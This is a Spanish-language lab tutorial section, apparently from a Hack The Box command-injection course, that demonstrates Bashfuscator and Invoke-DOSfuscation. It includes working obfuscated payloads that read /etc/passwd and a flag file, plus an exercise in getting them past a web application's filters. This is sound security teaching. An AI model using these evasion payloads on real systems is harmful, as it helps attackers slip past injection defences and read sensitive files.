Si estamos tratando con herramientas de seguridad avanzadas, es posible que no podamos usar técnicas básicas y manuales de ofuscación. En tales casos, puede ser mejor recurrir a herramientas automáticas de ofuscación. Esta sección discutirá un par de ejemplos de este tipo de herramientas, una para `Linux` y otra para `Windows`.

---

## Linux (Bashfuscator)

Una herramienta útil que podemos utilizar para ofuscar comandos bash es [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). Podemos clonar el repositorio desde GitHub y luego instalar sus requisitos, de la siguiente manera:



```r
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

Una vez que tengamos la herramienta configurada, podemos comenzar a usarla desde el directorio `./bashfuscator/bin/`. Hay muchas flags que podemos usar con la herramienta para ajustar nuestro comando ofuscado final, como podemos ver en el menú de ayuda `-h`:



```r
cd ./bashfuscator/bin/
./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

Podemos comenzar simplemente proporcionando el comando que queremos ofuscar con la flag `-c`:



```r
./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

Sin embargo, ejecutar la herramienta de esta manera elegirá aleatoriamente una técnica de ofuscación, que puede producir un comando con una longitud que varía desde unos pocos cientos de caracteres hasta más de un millón de caracteres. Así que podemos usar algunas de las flags del menú de ayuda para producir un comando ofuscado más corto y simple, de la siguiente manera:



```r
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

Ahora podemos probar el comando generado con `bash -c ''`, para ver si ejecuta el comando previsto:



```r
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

Podemos ver que el comando ofuscado funciona, todo mientras se ve completamente ofuscado y no se parece a nuestro comando original. También podemos notar que la herramienta utiliza muchas técnicas de ofuscación, incluidas las que discutimos previamente y muchas otras.

Ejercicio: Intenta probar el comando anterior con nuestra aplicación web, para ver si puede superar los filtros. Si no lo hace, ¿puedes adivinar por qué? ¿Y puedes hacer que la herramienta produzca un payload funcional?

---

## Windows (DOSfuscation)

También hay una herramienta muy similar que podemos usar para Windows llamada [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). A diferencia de `Bashfuscator`, esta es una herramienta interactiva, ya que la ejecutamos una vez e interactuamos con ella para obtener el comando ofuscado deseado. Una vez más, podemos clonar la herramienta desde GitHub y luego invocarla a través de PowerShell, de la siguiente manera:



```r
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

Incluso podemos usar `tutorial` para ver un ejemplo de cómo funciona la herramienta. Una vez que estemos listos, podemos comenzar a usar la herramienta, de la siguiente manera:



```r
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

Finalmente, podemos intentar ejecutar el comando ofuscado en `CMD`, y vemos que de hecho funciona como se esperaba:



```r
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

Consejo: Si no tenemos acceso a una VM de Windows, podemos ejecutar el código anterior en una VM de Linux a través de `pwsh`. Ejecuta `pwsh`, y luego sigue el mismo comando anterior. Esta herramienta está instalada por defecto en tu instancia de `Pwnbox`. También puedes encontrar instrucciones de instalación en este [enlace](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).

Para más información sobre métodos avanzados de ofuscación, puedes consultar el módulo [Secure Coding 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript), que cubre métodos avanzados de ofuscación que se pueden utilizar en varios ataques, incluidos los que cubrimos en este módulo.